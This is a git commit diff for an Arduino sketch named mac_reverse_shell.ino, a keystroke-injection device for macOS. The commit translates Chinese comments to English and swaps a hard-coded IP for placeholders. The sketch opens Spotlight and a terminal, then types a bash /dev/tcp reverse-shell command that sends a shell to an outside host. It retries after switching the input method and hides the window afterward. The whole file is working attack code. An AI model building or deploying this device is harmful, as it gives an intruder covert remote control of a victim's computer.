b463eb587f609db5dca73b4791df20980cc7faac
LzSkyline <lzskyline@foxmail.com>
2023-04-23 10:48:16 +0800

    explain code

--- mac_reverse_shell.ino
+++ mac_reverse_shell.ino
@@ -1,9 +1,9 @@
 #include<Keyboard.h>
 void setup() {
-  // 打开terminal
-  Keyboard.begin();//开始键盘通讯
+  // open terminal
+  Keyboard.begin();
   delay(3000);
-  Keyboard.press(KEY_LEFT_GUI);//win键
+  Keyboard.press(KEY_LEFT_GUI); //win key
   delay(200);
   Keyboard.press(' ');
   delay(200);
@@ -21,13 +21,14 @@ void setup() {
   Keyboard.press(KEY_CAPS_LOCK);
   Keyboard.release(KEY_CAPS_LOCK);
 
-  // 执行反弹shell
+  // exec reverse shell
   Keyboard.println(" screen");
   Keyboard.println("");
   Keyboard.println(" bash");
   Keyboard.println("");
   delay(200);
-  Keyboard.println(" bash -i>& /dev/tcp/10.252.211.241/12354 0>&1;history -r");
+  Keyboard.println(" bash -i>& /dev/tcp/{ip}/{port} 0>&1;history -r");
+  // for Chinese, handle PinYin input method
   Keyboard.press(KEY_LEFT_CTRL);
   delay(200);
   Keyboard.press(' ');
@@ -35,10 +36,12 @@ void setup() {
   Keyboard.release(KEY_LEFT_CTRL);
   delay(200);
   Keyboard.release(' ');
-  Keyboard.println(" bash -i>& /dev/tcp/10.252.211.241/12354 0>&1;history -r");
+  // switch input method and retry
+  Keyboard.println(" bash -i>& /dev/tcp/{ip}/{port} 0>&1;history -r");
   delay(200);
   Keyboard.println();
-  Keyboard.press(KEY_LEFT_GUI);//win键
+  // hide window
+  Keyboard.press(KEY_LEFT_GUI);//win key
   delay(200);
   Keyboard.press('q');
   Keyboard.release(KEY_LEFT_GUI);
@@ -46,8 +49,8 @@ void setup() {
   Keyboard.println("");
   
 
-  Keyboard.end();//结束键盘通讯
+  Keyboard.end();
 }
-void loop()//循环
+void loop()
 {
 }
